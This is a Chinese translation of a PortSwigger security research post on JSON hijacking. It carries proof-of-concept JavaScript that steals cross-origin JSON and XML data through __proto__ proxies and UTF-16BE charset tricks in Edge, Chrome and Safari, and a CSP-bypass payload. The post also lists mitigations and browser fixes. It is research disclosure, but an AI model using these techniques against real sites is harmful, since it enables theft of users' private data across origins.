原文链接：[JSON hijacking for the modern
web](http://blog.portswigger.net/2016/11/json-hijacking-for-modern-web.html)

原作者： **[Gareth Heyes](https://www.blogger.com/profile/10856178524811553475)**

译： **Holic (知道创宇404安全实验室)**

Benjamin Dumke-von der Ehe 发现了一种有趣的[跨域窃取数据](http://balpha.de/2013/02/plain-text-considered-harmful-a-cross-domain-exploit/)的方法。使用[JS
代理](https://developer.mozilla.org/en/docs/Web/JavaScript/Reference/Global_Objects/Proxy)，他能够创建一个
handler，可以窃取未定义的 JavaScript 变量。这个问题在 FireFox 浏览器中似乎被修复了，但是我发现了一种对 Edge
进行攻击的新方式。虽然 Edge 好像是阻止了分配 `window.__proto__` 的行为，但他们忘了 Object.setPrototypeOf
这个方法。利用这个方法，我们可以使用代理过的 `__proto__` 来覆盖 `__proto__` 属性。就像这样：

    
    
    <script>
    Object.setPrototypeOf(__proto__,new Proxy(__proto__,{
     has:function(target,name){
      alert(name);
     }
    }));
    </script>
    <script src="external-script-with-undefined-variable"></script>
    <!-- script contains: stealme --> 

#### [Edge PoC stealing undefined variable](http://portswigger-labs.net/jsproxy/edge_proxy_undefined_variable_read/)

如果你在跨域脚本中包含 stealme，你将会看到浏览器弹出了该值的警告，即它是一个未定义的变量。

经过进一步的测试，我发现通过覆盖`__proto __.__ proto__`可以实现相同的效果，在 Edge 浏览器上对应的是 [object
EventTargetPrototype] 。

    
    
    <script>
    __proto__.__proto__=new Proxy(__proto__,{
     has:function(target,name){
      alert(name);
     }
    });
    </script>
    <script src="external-script-with-undefined-variable"></script>

#### [Edge PoC stealing undefined variable method 2 ](http://portswigger-labs.net/jsproxy/edge_proxy_undefined_variable_read/index2.html)

很好，我们已经能跨域窃取数据了，但我们还能做什么呢？所有主流浏览器都支持脚本的 charset 属性。而我发现 UTF-16BE
字符集尤其有意思。UTF-16BE 是一个多字节编码的字符集，那么实际上是两个字节组成了一个字符。例如你的脚本以 `["` 开头，它将被认为是 0x5b22
而不是 0x5b 0x22。而 0x5b22 恰好是一个有效的 JavaScript 变量 =) 你能看懂这是怎么回事吗？

假设我们有一个来自 Web 服务器的响应，返回一个数组文本，我们便可以控制它的一部分。我们可以使用 UTF-16BE 字符集使数组文本成为未定义的
JavaScript 变量，并使用上面的技术窃取到它。唯一要注意的是，组成的字符必须形成一个有效的 JavaScript 变量。

例如，让我们看看以下响应：

    
    
    ["supersecret","input here"]

为了窃取到 supersecret，我们需要注入一个空字符，后面带着两个 a's ，出于某些原因，Edge 不会将其视为
UTF-16BE，除非它具有这些注入的字符。或许它在进行一些字符编码的扫描，亦或是截断响应和 NULL 后面的字符在 Edge 上不是一个有效的 JS
变量。这点我不确定，但是在我的测试中，似乎需要一个 NULL 与其他一些填充字符。参见下面的例子：

    
    
    <!doctype HTML>
    <script>
    Object.setPrototypeOf(__proto__,new Proxy(__proto__,{
        has:function(target,name){
            alert(name.replace(/./g,function(c){ c=c.charCodeAt(0);return String.fromCharCode(c>>8,c&0xff); }));
        }
    }));
    </script>
    <script charset="UTF-16BE" src="external-script-with-array-literal"></script>
    
    
    <!-- script contains the following response: ["supersecret","<?php echo chr(0)?>aa"] -->

#### [Edge PoC stealing JSON feeds](http://portswigger-labs.net/utf-16be/edge_steal_json_data_with_proxy/index2.php)

所以我们像以前一样代理 `__proto__` 属性，使用 UTF-16BE 编码包含此脚本，而且响应的字符文本中包含了一个 NULL，后面跟着两个
a's。然后我解码了移八位编码的 UTF-16BE ，获得第一个字节；并且通过按位“与”操作获得了第二个字节。结果是一个警告的弹出窗口，
`["supersecret","`。如你所见，Edge 似乎在 NULL 后截断了响应。请注意这种攻击是相当受限的，因为许多字符组合不会产生有效的
JavaScript 变量。然而，窃取少量数据可能是有用的。

### 在 Chrome 中窃取 JSON 推送

情况变得更糟了。Chrome 更加开放，有更多的异域字符编码。你不需要控制任何响应，Chrome
就可以使用该字符编码。唯一的要求便是之前所述，组合在一起的字符产生了一个有效的 JavaScript
变量。为了利用这个“特征”，我们需要另一个未定义的变量泄漏。一眼看上去 Chrome 似乎阻止了覆盖 `__proto__` 的行为，但是它却忘记了
`__proto__` 的深度。

    
    
    <script> 
    __proto__.__proto__.__proto__.__proto__.__proto__=new Proxy(__proto__,{
        has:function f(target,name){
            var str = f.caller.toString();
            alert(str.replace(/./g,function(c){ c=c.charCodeAt(0);return String.fromCharCode(c>>8,c&0xff); }));
        }
    });
    </script>
    <script charset="UTF-16BE" src="external-script-with-array-literal"></script>
    <!-- script contains the following response: ["supersecret","abc"] -->

**注意: 这一点已经在 Chrome 54 版本被修复**

[Chrome PoC stealing JSON feeds works in version 53](http://portswigger-labs.net/utf-16be/chrome_steal_json_data_with_proxy/index2.html)

我们在 `__proto__` 链中深入 5
层，并用我们的代理覆盖它，接下来的事情就很有意思了。尽管命名参数不包含我们未定义的变量，但是函数的调用者是包含的！它返回了一个带有我们变量名的函数！显然它用
UTF-16BE 编码了，看起来像是这样子的：

    
    
    function 嬢獵灥牳散牥琢Ⱒ慢挢崊

Waaahat? 那么我们的变量是在调用者中泄漏了。你必须调用函数的 toString 方法来访问数据，否则 Chrome
会抛出一个通用访问的异常。我试着通过检查函数的构造函数，以查看是否返回了一个不同的域（也许是 Chrome 扩展程序上下文），从而进一步利用漏洞。当
adblock 被启用时，我看到了一些使用这种方法的扩展程序代码，但无法利用它因为它似乎只是将代码注入到当前的 document。

在我的测试中，我也能够包含 xml 或者 HTML 跨域数据，甚至是 text/html 内容类型，这就成为一个相当严重的信息泄漏漏洞。而此漏洞已经在
Chrome 中被修复。

### 在 Safari 中窃取 JSON 推送

我们也很轻松地可以在最新版的 Safari 中实现同样的事情。我们仅需要少使用一个 proto ，并且从代理中使用 “name” 而不是调用者。

    
    
    <script>
    __proto__.__proto__.__proto__.__proto__=new Proxy(__proto__,{
            has:function f(target,name){
                alert(name.replace(/./g,function(c){ c=c.charCodeAt(0);return String.fromCharCode(c>>8,c&0xff); }));
            }
    });
    </script>

#### [Safari PoC stealing JSON feeds](http://portswigger-labs.net/utf-16be/safari_steal_json_data_with_proxy/)

经过进一步测试，我发现 Safari 和 Edge 一样受相同漏洞的影响，只需要`__proto__.__proto__` 。

### Hacking JSON feeds without JS proxies

我之前提到每个主流浏览器基本都支持 UTF-16BE 字符编码，可你要如何在没有 JS 代理的情况下黑掉 JSON
feeds呢？首先，你需要控制一些数据，而且必须用生成有效 JavaScript 变量的方式来构造 feed。在注入数据之前，获取 JSON
推送的第一部分非常简单，你所需要做的就是输出一个 UTF-16BE 编码字符串，该字符串将非 ASCII
变量分批给特定的值，然后循环遍历该窗口并检查该值的存在，那么属性将包含注入之前的所有 JSON feed。代码如下所示：

    
    
    =1337;for(i in window)if(window[i]===1337)alert(i)

这段代码被编码为 UTF-16BE 字符串，所以我们实际上得到的是代码而不是非 ASCII 变量。实际上就是说，用 NULL
填充每个字符。要获得注入字符串后的字符，我仅需使用增量运算符，并在窗口的属性之后制作编码后的字符串。继续往下看。

    
    
    setTimeout(function(){for(i in window){try{if(isNaN(window[i])&&typeof window[i]===/number/.source)alert(i);}))}catch(e){}}});++window.a

我将它包装在一个try catch 中，因为在 IE 上 ，当检查 isNaN 时 window.external 将会抛出一个异常。整个 JSON
feed 如下所示：

    
    
    {"abc":"abcdsssdfsfds","a":"<?php echo mb_convert_encoding("=1337;for(i in window)if(window[i]===1337)alert(i.replace(/./g,function(c){c=c.charCodeAt(0);return String.fromCharCode(c>>8,c&0xff);}));setTimeout(function(){for(i in window){try{if(isNaN(window[i])&&typeof window[i]===/number/.source)alert(i.replace(/./g,function(c){c=c.charCodeAt(0);return String.fromCharCode(c>>8,c&0xff);}))}catch(e){}}});++window.", "UTF-16BE")?>a":"dasfdasdf"}

[Hacking JSON feeds without proxies PoC](http://portswigger-labs.net/utf-16be/without_proxies/)

绕过 CSP

你可能已经注意到，UTF-16BE 转换的字符串也会将新行转换为非 ASCII 变量，这使它甚至有可能绕过 CSP！该 HTML 文档将被视为
JavaScript 变量。我要做的就是注入一个带有 UTF-16BE 字符集的脚本，注入至其自身，使其具有编码过的赋值和带有尾部注释的
payload。这将绕过 CSP 策略，该策略只允许引用同一域下的脚本（主流策略）。

HTML 文档将形似以下内容：

    
    
    <!doctype HTML><html>
    <head>
    <title>Test</title>
    <?php
    echo $_GET['x'];
    ?>
    </head>
    <body>
    </body>
    </html>

注意在 doctype 之后没有新行，HTML 是以这样一种方式构造的，即它是有效的
JavaScript，注入后面的字符无关紧要，因为我们注入了一行注释，而且新行也会被转换。注意，在文档中没有声明字符编码的声明，并不是因为字符集很重要，因为元素的引号和属性将破坏
JavaScript。payload 看起来像是这样（注意为了构造有效变量，一个选项卡是必要的）。

    
    
    <script%20src="index.php?x=%2509%2500%253D%2500a%2500l%2500e%2500r%2500t%2500(%25001%2500)%2500%253B%2500%252F%2500%252F"%20charset="UTF-16BE"></script>

请注意：这在更高版本的 PHP 中已经被修复了这一点，为了防止攻击，它默认被设成 UTF-8 字符编码的 text/html
内容类型。但是，我只是添加了空白字符编码到 JSON 响应，所有现在仍处于实验室阶段。

[CSP bypass using UTF-16BE PoC](http://portswigger-labs.net/utf-16be/csp/index.php?x=%3Cscript%20src=%22index.php?x=%2509%2500%253D%2500a%2500l%2500e%2500r%2500t%2500\(%25001%2500\)%2500%253B%2500%252F%2500%252F%22%20charset=%22UTF-16BE%22%3E%3C/script%3E)

### 其他编码

我 fuzz 了每个浏览器和字符编码。对 Edge 进行 fuzz
没什么用，主要是由于前面提到过的字符集嗅探，如果你在文档中没有使用确定的字符，他就不会使用字符编码。Chrome
则对此非常宽松，因为开发者工具让你通过正则过滤控制台的结果。我发现 ucs-2 编码允许你导入 XML 数据作为一个 JS 变量，但是它甚至比
UTF-16BE 更脆弱。我仍然设法在获得了以下的 XML，以便在 Chrome 上正确导入。

    
    
    <root><firstname>Gareth</firstname><surname>a<?php echo mb_convert_encoding("=1337;for(i in window)if(window[i]===1337)alert(i);setTimeout(function(){for(i in window)if(isNaN(window[i]) && typeof window[i]===/number/.source)alert(i);});++window..", "iso-10646-ucs-2")?></surname></root>

**以上内容在 Chrome 中已经不再有效，但可以当做另一个例子**

UTF-16 和 UTF-16LE 看起来也很有用，因为脚本的输出看起来像是一个 JavaScript 变量，但是当包含 doctype，XML 或
JSON 字符串时，它们引起了一些无效的语法错误。Safari 有一些有趣的结果，但在我的测试中，我不能用它生成有相当
JavaScript。这可能值得进一步探索，，但它将很难 fuzz，因为你需要编码字符，以产生一个有效的测试用例。我相信浏览器厂商能够更有效地做到这一点。

### CSS

你可能认为这种技术可以应用于 CSS，在理论上是可以的，因为任何 HTML 将被转换为非 ASCII 的无效 CSS
选择器。但实际上，浏览器似乎会在带着编码解析 CSS 之前，查看文档是否有 doctype
头并忽略样式表，这样的话注入样式表便失败了。Edge，Firefox 和 IE 在标准模式下似乎也会检查 mime 类型，Chrome
说样式表被解析了，但至少在我的测试中并不会这样。

### 解决方案

可以通过在 HTTP content type 头中声明你的字符编码（例如 UTF-8）来防止字符编码工具。PHP 5.6 还通过声明 UTF-8
编码来防止这些攻击，如果没有的话，就在 content-type 头中设置。

### 总结

Edge，Safari 和 Chrome 包含的错误让你可以跨域读取未声明的变量。你可以使用不同的编码绕过 CSP
绕过并窃取脚本数据。即使没有代理，如果可以控制一些 JSON 响应的话，你也可以窃取数据。

Enjoy - [@garethheyes](https://twitter.com/garethheyes)

附： **演示视频**

* * *

![Paper](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<https://paper.seebug.org/130/>

